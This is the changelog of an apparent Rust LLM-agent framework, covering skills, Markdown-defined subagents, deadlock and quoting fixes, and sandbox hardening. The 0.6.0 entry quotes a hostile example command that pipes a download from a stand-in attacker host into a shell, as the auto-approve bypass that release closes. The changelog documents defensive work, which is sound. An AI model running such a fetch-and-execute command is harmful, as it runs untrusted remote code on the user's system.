# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [0.7.0] - 2026-09-02

### Added

- **Bundled `SkillTool` + `SkillHook`** — the skill activation loop now
  ships in the framework: `SkillTool` lets the LLM load a skill by name,
  writing its content into the shared `ActiveSkills` state; `SkillHook`
  drains and re-injects active skills as `[SKILL]`-prefixed System messages
  on every `on_llm_start` (anchored after the static system prompt via
  `insert_before_history`, so the prompt-cache prefix stays stable).
  Harnesses no longer implement their own tool/hook — they wire registry +
  `ActiveSkills` + `SkillRegistry::system_prompt_section()` (new: renders
  the available-skill list for the system prompt). Both live in
  `agent_oxide::skills`.

### Changed

- **Extension reorganisation by feature (breaking)** — the `hooks` module
  is renamed to `compact` (`agent_oxide::compact::*`: `MicroCompactHook`,
  `MacroCompactHook`, `CompactError`, `COMPACT_*` constants); `SkillHook` +
  `SKILL_MARKER` move to `agent_oxide::skills`; the shared
  `insert_before_history` helper moves to `agent_oxide::util`.

- **Subagents are now Markdown-defined only (breaking)** — the compile-time
  path is removed: `SubagentConfig`, `filter_tools`, the fixed `"task"`
  tool name, and the old `SubagentTool::new(llm, config, tools, memory)`
  signature are gone. Subagents are defined as Markdown files with YAML
  frontmatter (`agents/*.md`, Claude Code style) and discovered at runtime
  via `SubagentRegistry::discover` + `register_subagents`. Each definition
  becomes its own tool named after the definition, with the definition's
  `description` as the routing signal the parent LLM sees.
  `SubagentTool::new(llm, def, parent_registry, parent_memory,
  parent_model)` builds a single tool from a `SubagentDef`; unset fields
  fall back to the internal config defaults, `model` falls back to the
  parent's model. Upgrading downstream crates requires writing
  `agents/*.md` files — see `docs/subagent-migration-guide.md`.

## [0.6.2] - 2026-08-16

### Fixed

- **ReAct loop self-deadlock on the final answer** — the 0.6.1
  `lock_memory()` refactor bound the memory write guard to a named
  variable that stayed alive across `return self.finish_run(...)`, so
  the write lock was still held (by the agent task itself) while
  `finish_run` synchronously notified hooks.  Hooks that take
  `memory.read()` in `on_run_finish` — `ObservabilityHook` (usage
  summary) and `PersistenceHook` (auto-save) — deadlocked the agent
  task on the first of them, so auto-save never ran and any later
  `memory.read()` (shutdown save, `/save`, UI refresh) hung forever.
  The guard is now scoped to the push and dropped before `finish_run`
  in both the streaming and non-streaming loops.  Regression tests
  assert `on_run_finish` observes a released write lock.

## [0.6.1] - 2026-08-14

### Fixed

- **`ShellRunner` Windows quoting** — building the command with
  `cmd.args([...])` applied Rust's CRT-style quoting (backslash-escaped
  `\"` inside the argument), which cmd's `/S /C` quote-stripping does not
  unescape.  Commands with inner quotes (`findstr /c:"a b"`,
  `git commit -m "msg"`, `echo "hello world"`) had backslashes leak into
  the output or broke into mangled arguments.  `build_command` now uses
  `raw_arg` with the command wrapped in an outer quote pair — cmd strips
  exactly that pair and inner quotes survive verbatim.  Regression tests
  for `findstr /c:` and `echo "..."` added (Windows).

## [0.6.0] - 2026-08-14

### Changed

- **`PersistenceHook` is now provider-generic** — `PersistenceHook<C: LLMClient>`
  instead of hardcoding `DeepSeekClient`, matching `SubagentTool` /
  `MacroCompactHook`.  Constructor parameter `flash_model` renamed to
  `title_model`.  **Breaking:** callers must name the type parameter or
  rely on inference.
- **`DEFAULT_MODEL` moved to the vendor module** —
  `agent_oxide::deepseek::DEFAULT_MODEL` now defines the fallback model
  used when no `#[agent(model)]` field is present; `agent_kit` re-exports
  it for backwards compatibility instead of defining a vendor constant
  in the generic layer.
- **Env sanitizer allowlist narrowed** — `PYTHONPATH`, `NODE_PATH`, and
  `RUSTC_WRAPPER` (code-loading injection vectors) are no longer passed
  to sandboxed child processes.
- **`ShellConfig::max_output_bytes` single-sourced** — the config default
  now references `encoding::MAX_OUTPUT_BYTES` instead of repeating the
  literal.
- **`Watchdog` gains `spawn_tree` + `fired`** — tree kill on Unix now
  targets the process group (requires `process_group(0)` in the caller);
  the `fired()` flag replaces elapsed-time heuristics for detecting
  watchdog kills.  Existing `spawn` semantics unchanged.
- **Shell auto-approve no longer covers chained commands** — any
  unquoted `&&` / `||` / `|` / `&` / `;` / backtick / `$(…)` forces a
  user prompt, closing the `echo hi && curl evil.com | sh`-style bypass
  (auto-approve applied to the first word only).  The scan is
  quote-aware; empty commands are now `Blocked` instead of prompting.
- **Approval prompt third option is now a denial** — the option formerly
  labelled "Other…" (which silently approved whatever the user typed)
  is now "Deny with reason…": the free-form text is recorded in the
  audit trail and returned to the model as the denial reason, and is
  never treated as approval.
- **Error types derive `thiserror` and preserve source chains** —
  `ProviderError::Http` now carries the underlying transport error
  (`Box<dyn Error + Send + Sync>`) instead of a flattened string, so
  `AgentError::Provider` chains down to e.g. `reqwest::Error` via
  `std::error::Error::source`.  **Breaking for downstream match sites:**
  `ProviderError::Http { message }` → `ProviderError::Http(_)` and
  `ProviderError::Parse { message }` → `ProviderError::Parse(_)`;
  `ProviderError::http_message(msg)` constructs a message-based Http
  error.  `DeepSeekError` / `AgentError` / `ToolError` keep their
  Display text.
- **Lock poisoning no longer panics the run** — every production
  `expect("… lock poisoned")` in the engine and extensions is gone.
  Engine memory locks now fail the run with `AgentError::Memory` (via
  `fail_run` — hooks and terminal events still fire); hooks and
  extensions degrade to log-and-skip; `ResponseRouter` reports routing
  failure instead of panicking.

Breaking changes above are documented with before/after code in
[docs/migration-guide-0.5.1-to-0.6.0.md](docs/migration-guide-0.5.1-to-0.6.0.md)
— keep that guide in sync with this section.

### Added

- **`AgentHook::on_tool_rejected`** — new defaulted callback (non-breaking
  for implementors) closing the hook terminal-callback pairing guarantee:
  when a tool call is rejected, every hook *before* the rejecting hook in
  the chain — i.e. every hook whose `before_tool_call` returned `Ok` for
  that call — receives exactly one terminal callback
  (`after_tool_call` / `on_tool_failed` / `on_tool_rejected`).
- **`ResourceTracker::acquire_shell_slot` / `ShellSlot`** — RAII
  concurrent-shell reservation: `commit()` records the completed
  operation, dropping without committing cancels the reservation.
- **`ShellRunner` + `ShellTool`** — the sandbox execution layers
  (env sanitization, tree watchdog kill, bounded output capture,
  decode/truncation) and the second-pass policy check now ship as
  in-library components; sandbox checks 13–16 are enforced by registering
  `ShellTool` instead of a hand-rolled shell tool.  `ToolApprovalMode`
  (`BlockOnly` default / `DenyUnapproved` for hook-less deployments)
  controls the second-pass semantics.
- **Umbrella crate** — `agent_oxide` re-exports the whole framework under
  one name (`use agent_oxide::prelude::*`), with a convenience prelude.
- **`provider`** — `LLMClient` trait (Rust 2024 native async fn, no
  `async-trait`) plus shared types: `Message`, `ToolCall`, `CompletionRequest`,
  `CompletionResponse`, `StreamChunk`, `Usage`.
- **`deepseek`** — DeepSeek API client, the reference `LLMClient`
  implementation.
- **`tools`** — `Tool` trait, `ToolRegistry`, `ProgressStream`, and the
  `#[tool]` proc macro (`tools-macros`) with lazily derived JSON Schema via
  `schemars`.
- **`memory`** — conversation memory buffer (`Memory`, `SharedMemory`,
  `PendingHints`).
- **`engine`** — the ReAct agent loop (`Agent`, `AgentBuilder`,
  `EngineContext`), the 9-callback `AgentHook` lifecycle, the streaming
  `AgentEvent` channel, and `ResponseRouter` for user-intervention routing.
- **`skills`** — `SkillDef` / `SkillRegistry`, `.md` skill discovery with
  YAML frontmatter.
- **`hooks` (compact)** — two-tier compaction: `MicroCompactHook` +
  `MacroCompactHook`.
- **`persistence`** — conversation save/load with LLM-generated thread
  titles (`PersistenceHook`).
- **`observability`** — full-chain tracing: `TraceEvent`, `TraceStore`
  (4096-entry ring buffer), lock-free `RunMetrics`.
- **`sandbox`** — 5-layer defense in depth: `WorkspaceFs` path sandbox,
  `ShellFilter` command classification, `SandboxHook` orchestration,
  `EnvSanitizer`, process watchdog.
- **`subagent`** — `SubagentTool`, spawning isolated child agents as a tool,
  with tool filtering to prevent recursion.
- **`agent_oxide::agent_kit` / `agent_oxide-macros`** — NOOA (NVIDIA OO Agents-style)
  ergonomics: `#[derive(Agent)]` + `#[agent_impl]` map class doc = system
  prompt, sync methods = tools, async methods = LLM generations,
  Pydantic-style returns = structured output, `#[strategy(...)]`,
  `#[context(...)]`, and `into_agent()` assembly into the core engine.
- **`util`** — `floor_char_boundary` helper (MSRV-compatible stand-in for
  `str::floor_char_boundary`).
- **Documentation** — README with four-layer architecture design, NOOA
  guide, Harness/UI guide, beginner guide, senior guide, sandbox
  architecture.

### Changed

- **16 crates → 2** — the workspace is now a single `agent_oxide` crate
  plus one proc-macro companion `agent-oxide-macros` (`#[derive(Agent)]`,
  `#[agent_impl]`, `#[tool]`). The old `core/` and `extensions/` sub-crates
  were merged; every public type is reachable under `agent_oxide::…` with
  no behavior change. The internal `use provider::…`-style imports became
  `crate::…` module paths.
- **Internal layout** — the modules are organized under `src/core/` (engine
  layer: provider, deepseek, tools, memory, util, engine) and
  `src/extensions/` (hooks, persistence, observability, sandbox, skills,
  subagent, agent_kit). `src/lib.rs` re-exports every module at the crate
  root, so the public API remains flat — `core/`/`extensions/` is purely
  an internal organization.
- **Macro-generated paths** — `#[tool]` output references
  `::agent_oxide::tools::…` / `::agent_oxide::serde_json::…`, and
  `#[derive(Agent)]` / `#[agent_impl]` reference `agent_oxide::agent_kit::…`
  (including `agent_oxide::agent_kit::serde` / `schemars` re-exports), so
  consumers only need the two crates on crates.io.


### Fixed

- **Concurrent-shell quota leak when another hook rejects a shell call** —
  `SandboxHook` reserved an `active_shells` slot in `before_tool_call`,
  but the engine's rejection path gave no terminal callback, so a
  rejection by a *later* hook (or a panicking tool task) never released
  it — two such events permanently exhausted `max_concurrent_shells`
  (default 2) and the session could never run a shell again.  Slots are
  now RAII guards released by `on_tool_rejected` / `after_tool_call` /
  `on_tool_failed`, with `on_run_start` / `on_run_finish` backstops and
  per-session counter cleanup (`finish_session`).
- **Observability hook rejection tracking activated** — `tool_rejection_count`
  is now incremented, `tool_starts` entries are cleaned up on rejection,
  and the previously reserved `TraceEvent::ToolCallRejected` is emitted.
- **Macro-compaction no longer loses history on summariser failure** —
  the drain happened *before* the summariser call, so a failed
  summarisation permanently destroyed the drained messages.  The hook now
  snapshots the would-be-drained messages, calls the summariser, and only
  drains + inserts the summary **after a successful summarisation** — a
  failure leaves the conversation fully intact.
- **Macro-compaction retry gate actually works** — `compaction_failed`
  was written but never read, so every subsequent LLM call re-drained and
  re-called the summariser in a tight loop.  The flag is now read: after
  a failure, retries are skipped until the context grows beyond the size
  at which it last failed (`threshold / 10`, min 4096 tokens), and
  `on_run_start` resets the gate for a fresh conversation.
- **`WorkspaceFs` TOCTOU re-check false positive on concurrent writes** —
  the `(len, mtime)` identity check ran *before* the per-file write lock,
  so a concurrent in-process write of equal-length content flipped the
  mtime between the check's two `metadata()` calls and was misreported
  as `WorkspaceEscape("file identity changed — possible symlink swap")`.
  `write` / `edit_lines` / `edit_content` now run the re-check **under**
  the per-file lock, which is held across the whole mutation; in-process
  operations serialize cleanly and external symlink swaps are still
  detected.  (Surfaced as the flaky
  `test_concurrent_write_and_edit_consistent` under full-suite load.)
## [0.5.1] - 2026-08-13

### Fixed

- **MSRV raised to 1.88** — required by `time` 0.3.47+ (patched
  RUSTSEC-2026-0009, an RFC 2822 parse stack-exhaustion DoS; unpatched
  versions could not be pinned without the bump). The 0.5.0 release's
  declared MSRV of 1.85 was too low once `time` resolved fresh.
- Collapsed nested `if-let` chains flagged by newer clippy
  (`collapsible_if`); no behavioral change.


[0.6.0]: https://github.com/Nie-Tianyi/agent_oxide/compare/v0.5.0...v0.6.0
[0.5.1]: https://github.com/Nie-Tianyi/agent_oxide/compare/v0.5.0...v0.5.1
